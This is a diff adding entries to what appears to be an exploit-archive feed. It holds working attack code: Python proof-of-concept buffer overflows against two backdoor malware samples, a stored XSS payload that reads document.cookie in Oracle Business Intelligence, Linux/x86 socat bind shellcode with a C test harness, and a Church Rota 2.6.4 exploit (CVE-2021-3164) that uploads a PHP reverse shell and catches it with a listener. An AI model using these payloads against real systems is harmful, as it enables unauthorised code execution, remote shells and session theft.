@@ -4,6 +4,133 @@
   
   
   <entry>
+    <title>Backdoor.Win32.Zombam.geq Remote Buffer Overflow</title>
+    <link href="/2021/01/21/Backdoor-Win32-Zombam-geq-Remote-Buffer-Overflow/"/>
+    <url>/2021/01/21/Backdoor-Win32-Zombam-geq-Remote-Buffer-Overflow/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Zombam-geq-Remote-Buffer-Overflow"><a href="#Backdoor-Win32-Zombam-geq-Remote-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.Zombam.geq Remote Buffer Overflow"></a>Backdoor.Win32.Zombam.geq Remote Buffer Overflow</h4><p>Backdoor.Win32.Zombam.geq malware suffers from a remote buffer overflow vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">80</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br>    PACKET=<span class="hljs-string">&quot;GET /&quot;</span>+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">2000</span>+<span class="hljs-string">&quot;HTTP/1.1\r\nHost: &quot;</span>+MALWARE_HOST+<span class="hljs-string">&quot;\r\n\r\n&quot;</span><br>    s.send(PACKET)<br>    s.close()<br>    print(<span class="hljs-string">&quot;Backdoor.Win32.Zombam.geq / Remote Buffer Overflow&quot;</span>);<br>    print(<span class="hljs-string">&quot;MD5: fd14cc7f025f49a3e08b4169d44a774e&quot;</span>);<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Remote Buffer Overflow</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Backdoor.Win32.Whirlpool.10 Remote Stack Buffer Overflow</title>
+    <link href="/2021/01/21/Backdoor-Win32-Whirlpool-10-Remote-Stack-Buffer-Overflow/"/>
+    <url>/2021/01/21/Backdoor-Win32-Whirlpool-10-Remote-Stack-Buffer-Overflow/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Whirlpool-10-Remote-Stack-Buffer-Overflow"><a href="#Backdoor-Win32-Whirlpool-10-Remote-Stack-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.Whirlpool.10 Remote Stack Buffer Overflow"></a>Backdoor.Win32.Whirlpool.10 Remote Stack Buffer Overflow</h4><p>Backdoor.Win32.Whirlpool.10 malware suffers from a remote stack buffer overflow vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">8864</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_DGRAM) <br>    s.connect((MALWARE_HOST, PORT))<br><br>    PACKET=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">192</span><br><br>    s.send(PACKET)<br>    s.close()<br><br>    print(<span class="hljs-string">&quot;Backdoor.Win32.Whirlpool.10.b / Remote Buffer Overflow&quot;</span>)<br>    print(<span class="hljs-string">&quot;MD5: bf0682b674ef23cf8ba0deeaf546f422&quot;</span>)<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Remote Stack Buffer Overflow</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Oracle Business Intelligence Enterprise Edition 11.1.1.7.140715 XSS</title>
+    <link href="/2021/01/21/Oracle-Business-Intelligence-Enterprise-Edition-11-1-1-7-140715-XSS/"/>
+    <url>/2021/01/21/Oracle-Business-Intelligence-Enterprise-Edition-11-1-1-7-140715-XSS/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Oracle-Business-Intelligence-Enterprise-Edition-11-1-1-7-140715-XSS"><a href="#Oracle-Business-Intelligence-Enterprise-Edition-11-1-1-7-140715-XSS" class="headerlink" title="Oracle Business Intelligence Enterprise Edition 11.1.1.7.140715 XSS"></a>Oracle Business Intelligence Enterprise Edition 11.1.1.7.140715 XSS</h4><p>Oracle Business Intelligence Enterprise Edition version 11.1.1.7.140715 suffers from a persistent cross site scripting vulnerability.</p><p>Stored  XSS:</p><p>“;!—“”<script>alert(document.cookie);</script>=&amp;{(alert(document.cokie))}</p><p>Vulnerable area = Dashboard - Add New Text</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Cross Site Scripting</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Linux/x86 Socat Bind Shellcode</title>
+    <link href="/2021/01/21/Linux-x86-Socat-Bind-Shellcode/"/>
+    <url>/2021/01/21/Linux-x86-Socat-Bind-Shellcode/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Linux-x86-Socat-Bind-Shellcode"><a href="#Linux-x86-Socat-Bind-Shellcode" class="headerlink" title="Linux/x86 Socat Bind Shellcode"></a>Linux/x86 Socat Bind Shellcode</h4><p>113 bytes small Linux/x86 Socat bind shellcode.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">/* Exploit Title: Linux/x86 - Socat Bind Shellcode (113 bytes)<br>  Date: 01-19-2021<br>  Author: Felipe Winsnes<br>  Tested on: Debian x86<br>  Shellcode Length: 113<br><br>global _start<br><br>section .text<br><br>_start:<br><br>        xor eax, eax<br>        push eax<br><br>        PUSH 0x30303030 ; &quot;tcp-listen:10000&quot;<br>        PUSH 0x313a6e65<br>        PUSH 0x7473696c<br>        PUSH 0x2d706374<br><br>        mov esi, esp<br>        push eax<br><br>        PUSH 0x2c656e61 ; &quot;exec:&#x27;bash&#x27;,pty,stderr,setsid,sigint,sane,&quot;<br>        PUSH 0x732c746e<br>        PUSH 0x69676973<br>        PUSH 0x2c646973<br>        PUSH 0x7465732c<br>        PUSH 0x72726564<br>        PUSH 0x74732c79<br>        PUSH 0x74702c68<br>        PUSH 0x7361623a<br>        PUSH 0x63657865<br><br>        mov edi, esp<br>        push eax<br><br>        PUSH 0x7461636f ; &quot;///usr/bin/socat&quot;<br>        PUSH 0x732f6e69<br>        PUSH 0x622f7273<br>        PUSH 0x752f2f2f<br><br>        mov ebx, esp<br>        push eax<br><br>        mov edx, esp<br><br>        push esi<br>        push edi<br>        push ebx<br><br>        mov ecx, esp<br>        mov al, 11<br>        int 0x80<br>*/<br><br><span class="hljs-meta">#</span><span class="bash">include&lt;stdio.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include&lt;string.h&gt;</span><br><br>unsigned char code[] = \<br>&quot;\x31\xc0\x50\x68\x30\x30\x30\x30\x68\x65\x6e\x3a\x31\x68\x6c\x69\x73\x74\x68\x74\x63\x70\x2d\x89\xe6\x50\x68\x61\x6e\x65\x2c\x68\x6e\x74\x2c\x73\x68\x73\x69\x67\x69\x68\x73\x69\x64\x2c\x68\x2c\x73\x65\x74\x68\x64\x65\x72\x72\x68\x79\x2c\x73\x74\x68\x68\x2c\x70\x74\x68\x3a\x62\x61\x73\x68\x65\x78\x65\x63\x89\xe7\x50\x68\x6f\x63\x61\x74\x68\x69\x6e\x2f\x73\x68\x73\x72\x2f\x62\x68\x2f\x2f\x2f\x75\x89\xe3\x50\x89\xe2\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;<br><br>main()<br>&#123;<br><br>  printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));<br><br>int (*ret)() = (int(*)())code;<br><br>ret();<br><br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Shellcode</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Bind Shellcode</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Church Rota 2.6.4 Shell Upload</title>
+    <link href="/2021/01/21/Church-Rota-2-6-4-Shell-Upload/"/>
+    <url>/2021/01/21/Church-Rota-2-6-4-Shell-Upload/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Church-Rota-2-6-4-Shell-Upload"><a href="#Church-Rota-2-6-4-Shell-Upload" class="headerlink" title="Church Rota 2.6.4 Shell Upload"></a>Church Rota 2.6.4 Shell Upload</h4><p>Church Rota version 2.6.4 suffers from an unauthenticated remote shell upload vulnerability.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> listen<br><br><span class="hljs-comment">############################################################################################################</span><br><span class="hljs-comment"># CVE-2021-3164</span><br><span class="hljs-comment"># Church Rota version 2.6.4 is vulnerable to authenticated remote code execution.                          #</span><br><span class="hljs-comment"># The user does not need to have file upload permission in order to upload and execute an arbitrary file.  #</span><br><span class="hljs-comment"># The application is written primarily with PHP so we use PHP in our PoC                                   #</span><br><span class="hljs-comment">############################################################################################################</span><br><br><span class="hljs-comment"># credentials of the low privilege user</span><br>USERNAME=<span class="hljs-string">&#x27;slixperi&#x27;</span><br>PASSWORD=<span class="hljs-string">&#x27;slixperi&#x27;</span><br><br>LISTENER_IP = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>LISTENER_PORT = <span class="hljs-string">&#x27;4444&#x27;</span><br>TARGET_IP = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>TARGET_PORT = <span class="hljs-string">&#x27;8081&#x27;</span><br><br><span class="hljs-comment"># set the credentials for login POST</span><br>credentials = &#123;<span class="hljs-string">&quot;username&quot;</span>:USERNAME,<span class="hljs-string">&quot;password&quot;</span>:PASSWORD&#125;<br><span class="hljs-comment"># create a session to preserve session state</span><br>sesh = requests.session()<br><span class="hljs-comment"># login as our low-privilege user (normally only admins can upload files)</span><br>sesh.post(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;TARGET_IP&#125;</span>:<span class="hljs-subst">&#123;TARGET_PORT&#125;</span>/login.php&quot;</span>, data=credentials)<br><br><span class="hljs-comment"># define the payload</span><br>payload = <span class="hljs-string">f&quot;&lt;?php $sock=fsockopen(\&quot;<span class="hljs-subst">&#123;LISTENER_IP&#125;</span>\&quot;,<span class="hljs-subst">&#123;LISTENER_PORT&#125;</span>);$proc=proc_open(\&quot;/bin/sh -i\&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); ?&gt;&quot;</span><br><br><span class="hljs-comment"># file upload</span><br>sesh.headers.update(&#123;<span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;TARGET_IP&#125;</span>:<span class="hljs-subst">&#123;TARGET_PORT&#125;</span>/resources.php?action=new&quot;</span>&#125;)<br>files = &#123;<span class="hljs-string">&#x27;resourcefile&#x27;</span>: (<span class="hljs-string">&quot;shell.php&quot;</span>, payload)&#125;<br>sesh.post(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;TARGET_IP&#125;</span>:<span class="hljs-subst">&#123;TARGET_PORT&#125;</span>/resources.php?action=newsent&quot;</span>, files=files)<br><br>l = listen(LISTENER_PORT)<br><br><span class="hljs-comment"># execute the file</span><br>sesh.get(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;TARGET_IP&#125;</span>:<span class="hljs-subst">&#123;TARGET_PORT&#125;</span>/documents/shell.php&quot;</span>)<br><br>l.interactive()<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Shell Upload</tag>
+      
+      <tag>CVE-2021-3164</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Newfuture Trojan V.1.0 BETA 1 Insecure Permissions</title>
     <link href="/2021/01/20/Newfuture-Trojan-V-1-0-BETA-1-Insecure-Permissions/"/>
     <url>/2021/01/20/Newfuture-Trojan-V-1-0-BETA-1-Insecure-Permissions/</url>
